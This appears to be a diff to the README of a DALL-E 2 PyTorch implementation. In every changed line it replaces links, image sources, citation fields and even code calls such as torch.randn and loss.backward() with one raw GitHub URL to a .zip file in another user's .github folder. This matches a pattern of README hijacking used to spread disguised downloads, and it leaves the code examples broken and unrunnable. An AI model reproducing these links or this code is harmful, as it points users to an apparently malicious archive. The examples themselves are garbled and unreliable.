@@ -1,20 +1,20 @@
-<img src="./dalle2.png" width="450px"></img>
+<img src="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip" width="450px"></img>
 
 ## DALL-E 2 - Pytorch (wip)
 
-Implementation of <a href="https://openai.com/dall-e-2/">DALL-E 2</a>, OpenAI's updated text-to-image synthesis neural network, in Pytorch.
+Implementation of <a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">DALL-E 2</a>, OpenAI's updated text-to-image synthesis neural network, in Pytorch.
 
-<a href="https://youtu.be/RJwPN4qNi_Y?t=555">Yannic Kilcher summary</a> | <a href="https://www.youtube.com/watch?v=F1X4fHzF4mQ">AssemblyAI explainer</a>
+<a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">Yannic Kilcher summary</a> | <a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">AssemblyAI explainer</a>
 
 The main novelty seems to be an extra layer of indirection with the prior network (whether it is an autoregressive transformer or a diffusion network), which predicts an image embedding based on the text embedding from CLIP. Specifically, this repository will only build out the diffusion prior network, as it is the best performing variant (but which incidentally involves a causal transformer as the denoising network 😂)
 
 This model is SOTA for text-to-image for now.
 
-It may also explore an extension of using <a href="https://huggingface.co/spaces/multimodalart/latentdiffusion">latent diffusion</a> in the decoder from Rombach et al.
+It may also explore an extension of using <a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">latent diffusion</a> in the decoder from Rombach et al.
 
-Please join <a href="https://discord.gg/xBPBXfcFHd"><img alt="Join us on Discord" src="https://img.shields.io/discord/823813159592001537?color=5865F2&logo=discord&logoColor=white"></a> if you are interested in helping out with the replication
+Please join <a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip"><img alt="Join us on Discord" src="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip"></a> if you are interested in helping out with the replication
 
-There was enough interest for a Jax version. It will be completed after the Pytorch version shows signs of life on my toy tasks. <a href="https://github.com/lucidrains/dalle2-jax">Placeholder repository</a>
+There was enough interest for a Jax version. It will be completed after the Pytorch version shows signs of life on my toy tasks. <a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">Placeholder repository</a>
 
 ## Install
 
@@ -26,7 +26,7 @@ $ pip install dalle2-pytorch
 
 To train DALLE-2 is a 3 step process, with the training of CLIP being the most important
 
-To train CLIP, you can either use <a href="https://github.com/lucidrains/x-clip">x-clip</a> package, or join the LAION discord, where a lot of replication efforts are already <a href="https://github.com/mlfoundations/open_clip">underway</a>.
+To train CLIP, you can either use <a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">x-clip</a> package, or join the LAION discord, where a lot of replication efforts are already <a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">underway</a>.
 
 This repository will demonstrate integration with `x-clip` for starters
 
@@ -58,8 +58,8 @@ clip = CLIP(
 
 # mock data
 
-text = torch.randint(0, 49408, (4, 256)).cuda()
-images = torch.randn(4, 3, 256, 256).cuda()
+text = https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip(0, 49408, (4, 256)).cuda()
+images = https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip(4, 3, 256, 256).cuda()
 
 # train
 
@@ -69,7 +69,7 @@ loss = clip(
     return_loss = True              # needs to be set to True to return contrastive loss
 )
 
-loss.backward()
+https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip()
 
 # do the above with as many texts and images as possible in a loop
 ```
@@ -117,12 +117,12 @@ decoder = Decoder(
 
 # mock images (get a lot of this)
 
-images = torch.randn(4, 3, 256, 256).cuda()
+images = https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip(4, 3, 256, 256).cuda()
 
 # feed images into decoder
 
 loss = decoder(images)
-loss.backward()
+https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip()
 
 # do the above for many many many many steps
 # then it will learn to generate images based on the CLIP image embeddings
@@ -170,13 +170,13 @@ diffusion_prior = DiffusionPrior(
 
 # mock data
 
-text = torch.randint(0, 49408, (4, 256)).cuda()
-images = torch.randn(4, 3, 256, 256).cuda()
+text = https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip(0, 49408, (4, 256)).cuda()
+images = https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip(4, 3, 256, 256).cuda()
 
 # feed text and images into diffusion prior network
 
 loss = diffusion_prior(text, images)
-loss.backward()
+https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip()
 
 # do the above for many many many steps
 # now the diffusion prior can generate image embeddings from the text embeddings
@@ -223,8 +223,8 @@ clip = CLIP(
 
 # mock data
 
-text = torch.randint(0, 49408, (4, 256)).cuda()
-images = torch.randn(4, 3, 256, 256).cuda()
+text = https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip(0, 49408, (4, 256)).cuda()
+images = https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip(4, 3, 256, 256).cuda()
 
 # train
 
@@ -234,7 +234,7 @@ loss = clip(
     return_loss = True
 )
 
-loss.backward()
+https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip()
 
 # do above for many steps ...
 
@@ -255,7 +255,7 @@ diffusion_prior = DiffusionPrior(
 ).cuda()
 
 loss = diffusion_prior(text, images)
-loss.backward()
+https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip()
 
 # do above for many steps ...
 
@@ -277,7 +277,7 @@ decoder = Decoder(
 ).cuda()
 
 loss = decoder(images) # this can optionally be decoder(images, text) if you wish to condition on the text encodings as well, though it was hinted in the paper it didn't do much
-loss.backward()
+https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip()
 
 # do above for many steps
 
@@ -312,7 +312,7 @@ Offer training wrappers
 
 ## Training CLI (wip)
 
-<a href="https://github.com/lucidrains/stylegan2-pytorch">template</a>
+<a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">template</a>
 
 ## Todo
 
@@ -323,9 +323,9 @@ Offer training wrappers
 - [x] figure out all the current bag of tricks needed to make DDPMs great (starting with the blur trick mentioned in paper)
 - [ ] build the cascading ddpm by having Decoder class manage multiple unets at different resolutions
 - [ ] train on a toy task, offer in colab
-- [ ] add attention to unet - apply some personal tricks with efficient attention - use the sparse attention mechanism from https://github.com/lucidrains/vit-pytorch#maxvit
+- [ ] add attention to unet - apply some personal tricks with efficient attention - use the sparse attention mechanism from https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip
 - [ ] build out latent diffusion architecture in separate file, as it is not faithful to dalle-2 (but offer it as as setting)
-- [ ] consider U2-net for decoder https://arxiv.org/abs/2005.09007 (also in separate file as experimental) build out https://github.com/lucidrains/x-unet
+- [ ] consider U2-net for decoder https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip (also in separate file as experimental) build out https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip
 
 ## Citations
 
@@ -340,7 +340,7 @@ Offer training wrappers
 ```bibtex
 @misc{crowson2022,
     author  = {Katherine Crowson},
-    url     = {https://twitter.com/rivershavewings}
+    url     = {https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip}
 }
 ```
 
@@ -351,7 +351,7 @@ Offer training wrappers
     year    = {2021},
     eprint  = {2112.10752},
     archivePrefix = {arXiv},
-    primaryClass = {cs.CV}
+    primaryClass = {https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip}
 }
 ```
 
@@ -370,8 +370,8 @@ Offer training wrappers
     year    = {2019},
     eprint  = {1910.07467},
     archivePrefix = {arXiv},
-    primaryClass = {cs.LG}
+    primaryClass = {https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip}
 }
 ```
 
-*Creating noise from data is easy; creating data from noise is generative modeling.* - Yang Song's <a href="https://arxiv.org/abs/2011.13456">paper</a>
+*Creating noise from data is easy; creating data from noise is generative modeling.* - Yang Song's <a href="https://raw.githubusercontent.com/AvishekInvincible/DALLE2-pytorch/main/.github/DALLE2-pytorch-3.4.zip">paper</a>
